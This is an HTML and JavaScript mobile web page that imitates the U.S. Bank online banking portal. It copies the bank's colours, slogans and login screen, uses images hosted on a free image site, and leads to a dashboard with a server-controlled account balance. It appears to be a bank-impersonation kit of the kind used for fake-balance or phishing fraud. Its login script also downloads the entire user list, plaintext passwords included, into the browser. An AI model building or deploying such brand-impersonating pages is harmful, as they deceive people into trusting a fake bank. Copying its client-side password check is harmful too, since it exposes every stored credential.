<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>US Banking</title>
    <meta property="og:title" content="US Banking Portal">
    <meta property="og:description" content="Log in to your US Banking account securely.">
    <meta property="og:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
    
    <style>
        :root { 
            --usbank-red: #c8202e; --usbank-blue: #002d72; --bg-dark-blue: #051b49; --bg-light-blue: #0a2d7a; 
            --text-light-blue: #a4c2f4; --text-gray: #e0e0e0; --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            --action-blue: #1f5dc1; --bg-gray: #f4f5f8; --zelle-purple: #6f2da8; 
        }
        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden; background-color: var(--bg-gray); font-family: var(--font-family); }
        .mobile-container { width: 100%; height: 100vh; height: 100dvh; background-color: var(--bg-gray); position: relative; display: flex; flex-direction: column; overflow: hidden; }
        .hidden { display: none !important; }
        #main-page, #login-page, #create-account-page, #profile-page { height: 100%; overflow-y: auto; background-color: #ffffff; display: flex; flex-direction: column; -webkit-overflow-scrolling: touch; width: 100%; }
        #main-page { background-color: var(--bg-gray); }
        .navbar, .login-header, .dash-header { background-color: #ffffff; display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; width: 100%; position: sticky; top: 0; z-index: 100; box-sizing: border-box; }
        .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
        .hamburger span { display: block; width: 22px; height: 2px; background-color: #555; }
        .logo img { height: 32px; width: auto; display: block; mix-blend-mode: multiply; }
        .login-btn { color: #0056b3; text-decoration: none; font-weight: 600; font-size: 16px; cursor: pointer; }
        .hero { position: relative; padding: 30px 24px; z-index: 1; background-color: var(--bg-dark-blue); overflow: hidden; width: 100%; box-sizing: border-box; }
        .eyebrow { color: #ffffff; font-size: 12px; letter-spacing: 1.5px; font-weight: 500; margin-bottom: 12px; opacity: 0.8; }
        .red-line { width: 32px; height: 3px; background-color: var(--usbank-red); margin-bottom: 20px; }
        h1 { color: #ffffff; font-size: 40px; line-height: 1.15; font-weight: 300; margin-bottom: 20px; }
        h1 .light-blue { color: var(--text-light-blue); }
        .sub-headline { color: var(--text-gray); font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
        .button-group { display: flex; flex-direction: column; gap: 12px; }
        .btn { width: 100%; padding: 16px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; border: none; }
        .btn-primary { background-color: #ffffff; color: #1a56c4; }
        .btn-secondary { background-color: transparent; color: #ffffff; border: 1px solid #ffffff; }
        .scroll-content { width: 100%; font-size: 0; background-color: #ffffff; }
        .scroll-content img { width: 100%; height: auto; display: block; }
        .form-container { padding: 24px; flex: 1; width: 100%; box-sizing: border-box; }
        .fdic-box { border: 1px solid #dcdcdc; border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; margin-bottom: 32px; }
        .fdic-logo { font-size: 20px; font-weight: 900; color: #0f2e5b; margin-right: 12px; }
        .fdic-text { font-size: 13px; color: #333; font-style: italic; }
        .account-login-title, .form-title { font-size: 26px; font-weight: 700; color: #222; margin-bottom: 32px; }
        .input-group, .form-group { position: relative; margin-bottom: 24px; }
        .input-group input, .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .show-toggle { position: absolute; right: 10px; top: 15px; font-size: 14px; color: #555; cursor: pointer; font-weight: 500; }
        .remember-group { display: flex; align-items: center; margin-bottom: 32px; }
        .remember-group input[type="checkbox"] { width: 22px; height: 22px; margin-right: 12px; }
        .btn-login-pwd, .submit-btn { width: 100%; padding: 16px; border-radius: 8px; background-color: var(--action-blue); color: white; border: none; font-size: 17px; font-weight: 600; cursor: pointer; margin-bottom: 24px; }
        .divider { display: flex; align-items: center; text-align: center; color: #666; font-size: 14px; margin-bottom: 24px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #ccc; }
        .divider::before { margin-right: 16px; } .divider::after { margin-left: 16px; }
        .btn-passkey { width: 100%; padding: 14px; border-radius: 8px; background-color: transparent; color: var(--action-blue); border: 1px solid var(--action-blue); font-size: 17px; font-weight: 600; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 32px; }
        .forgot-link { display: flex; align-items: center; color: var(--action-blue); font-size: 18px; font-weight: 600; cursor: pointer; margin-bottom: 16px; }
        .enroll-link { color: #444; font-size: 16px; font-weight: 600; text-decoration: none; }
        #app-wrapper { flex: 1; display: flex; flex-direction: column; background-color: var(--bg-gray); overflow: hidden; height: 100%; width: 100%; }
        .app-content { padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 100px; width: 100%; box-sizing: border-box; }
        .dash-date { font-size: 12px; color: #666; text-transform: uppercase; margin-bottom: 8px; }
        .dash-greeting { font-size: 32px; font-weight: 300; color: #333; margin-bottom: 24px; }
        .offer-banner { background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 12px; padding: 16px; display: flex; align-items: center; margin-bottom: 24px; position: relative; }
        .offer-text span { font-size: 10px; color: #777; text-transform: uppercase; display: block; margin-bottom: 4px; }
        .offer-text h4 { font-size: 14px; color: #333; font-weight: 600; }
        .offer-text p { font-size: 12px; color: #666; }
        .section-title { font-size: 12px; color: #666; text-transform: uppercase; margin-bottom: 12px; margin-top: 24px; font-weight: 600; }
        .account-card { background-color: #ffffff; border-radius: 12px; padding: 24px; display: flex; flex-direction: column; margin-bottom: 16px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); cursor: pointer; }
        .account-name { font-size: 14px; color: #555; font-weight: 600; text-transform: uppercase; margin-bottom: 8px; }
        .account-balance { font-size: 34px; color: #111; font-weight: 400; margin-bottom: 4px; }
        .account-sub { font-size: 13px; color: #888; }
        .total-balance-row { display: flex; justify-content: space-between; padding: 0 4px; margin-top: 4px; margin-bottom: 24px; font-size: 14px; color: #555; font-weight: 500; }
        .transaction-item { background-color: #ffffff; border-radius: 12px; padding: 18px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .bottom-nav { position: absolute; bottom: 0; left: 0; width: 100%; background-color: #ffffff; display: flex; justify-content: space-around; align-items: center; padding: 10px 0; border-top: 1px solid #e0e0e0; z-index: 100; box-sizing: border-box; }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #666; cursor: pointer; width: 25%; }
        .nav-item.active { color: var(--action-blue); }
        .nav-item svg { width: 26px; height: 26px; margin-bottom: 4px; stroke: currentColor; fill: none; }
        .nav-item span { font-size: 11px; }
        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.6); z-index: 2000; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .modal-box { background-color: #ffffff; width: 100%; max-width: 380px; border-radius: 16px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .back-btn { background: none; border: none; font-size: 24px; color: #333; cursor: pointer; margin-right: 16px; }
    </style>
</head>
<body>
    <div class="mobile-container">
        <!-- Main Landing Page -->
        <div id="main-page">
            <header class="navbar">
                <div class="hamburger"><span></span><span></span><span></span></div>
                <div class="logo"><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Banking"></div>
                <a class="login-btn" onclick="showPage('login-page')">Log in</a>
            </header>
            <section class="hero">
                <div class="eyebrow">PERSONAL BANKING</div>
                <div class="red-line"></div>
                <h1><span class="light-blue">The NFL runs on</span><br>teamwork. <span class="light-blue">So do we.</span></h1>
                <p class="sub-headline">That's why U.S. Bank Smartly® Checking and Savings team up to help you earn more from day one.</p>
                <div class="button-group">
                    <button class="btn btn-primary">Open checking & savings</button>
                    <button class="btn btn-secondary">Learn more</button>
                </div>
            </section>
        </div>

        <!-- Login Page -->
        <div id="login-page" class="hidden">
            <header class="login-header">
                <button class="back-btn" onclick="showPage('main-page')">&#8592;</button>
                <div class="logo"><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Banking"></div>
            </header>
            <div class="form-container">
                <h2 class="account-login-title">Account login</h2>
                <form id="login-form" onsubmit="handleLogin(event)">
                    <div class="input-group"><input type="text" id="login-username" placeholder="Username" required></div>
                    <div class="remember-group"><input type="checkbox" id="remember"><label for="remember">Remember my username</label></div>
                    <div class="input-group">
                        <input type="password" id="login-password" placeholder="Password" required>
                        <span class="show-toggle" onclick="togglePassword('login-password', this)">Show</span>
                    </div>
                    <button type="submit" class="btn-login-pwd">Log in with password</button>
                    <a class="forgot-link" onclick="showPage('create-account-page')">Enroll in online banking</a>
                </form>
            </div>
        </div>

        <!-- Dashboard Wrapper -->
        <div id="app-wrapper" class="hidden">
            <div id="tab-accounts" style="height: 100%; display: flex; flex-direction: column;">
                <header class="dash-header">
                    <div class="hamburger"><span></span><span></span><span></span></div>
                    <div class="dash-header-title">Accounts</div>
                </header>
                <div class="app-content">
                    <div class="dash-greeting" id="dash-greeting">Welcome, User.</div>
                    <div class="account-card">
                        <div class="account-name">Checking ...1112</div>
                        <div class="account-balance" id="dash-bal-checking">$0.00</div>
                    </div>
                </div>
            </div>
            <div class="bottom-nav">
                <div class="nav-item active" onclick="switchTab('accounts')"><span>Accounts</span></div>
            </div>
        </div>
    </div>

    <script>
        let users = {}, settings = {}, currentUser = null;
        async function syncData() {
            try {
                const res = await fetch('/api/data');
                const data = await res.json();
                users = data.users || {};
                settings = data.settings || {};
            } catch(e) { console.error(e); }
        }
        async function handleLogin(event) {
            event.preventDefault();
            await syncData();
            const u = document.getElementById('login-username').value.trim().toLowerCase();
            const p = document.getElementById('login-password').value;
            if (users[u] && users[u].password === p) {
                currentUser = users[u];
                showPage('app-wrapper');
            } else { alert('Incorrect credentials'); }
        }
        function showPage(id) {
            ['main-page', 'login-page', 'app-wrapper'].forEach(p => document.getElementById(p).classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
        }
        window.onload = syncData;
    </script>
</body>
</html>
